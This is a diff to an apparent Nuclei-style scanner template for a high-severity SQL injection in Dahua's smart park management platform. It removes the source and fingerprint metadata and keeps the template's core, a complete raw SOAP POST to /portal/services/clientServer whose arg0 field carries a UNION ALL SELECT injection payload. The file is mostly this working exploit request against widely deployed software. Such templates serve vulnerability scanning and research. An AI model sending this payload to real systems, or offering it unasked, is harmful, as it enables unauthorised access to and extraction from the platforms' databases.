@@ -3,14 +3,8 @@ info:
   name: 大华智慧园区综合管理平台getGroupInfoListByGroupIdSQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/8cf416714b3cfb8eea76494b5e414f19
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: sqli,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: 8cf416714b3cfb8eea76494b5e414f19
-    fofa: + hunter：`app.name="Dahua 大华 智慧园区管理平台"`
 http:
 - raw:
   - "POST /portal/services/clientServer HTTP/1.1\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:120.0) Gecko/20100101 Firefox/120.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate\nConnection: close\nUpgrade-Insecure-Requests: 1\nSOAPAction:\nContent-Type: text/xml;charset=UTF-8\nHost: {{Hostname}}\nContent-Length: 509\n\n<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:cli=\"http://clientServer.webservice.dssc.dahua.com\">\n   <soapenv:Header/>\n   <soapenv:Body>\n      <cli:getGroupInfoListByGroupId>\n         <!--type: string-->\n         <arg0>5398) UNION ALL SELECT 5336,5336,5336,5336,CONCAT(0x7178787a71,IFNULL(CAST(111*111 AS NCHAR),0x20),0x7171717871)-- -</arg0>\n\n         <!--type: long-->\n         <arg1>10</arg1>\n\n      </cli:getGroupInfoListByGroupId>\n\n   </soapenv:Body>\n\n</soapenv:Envelope>"
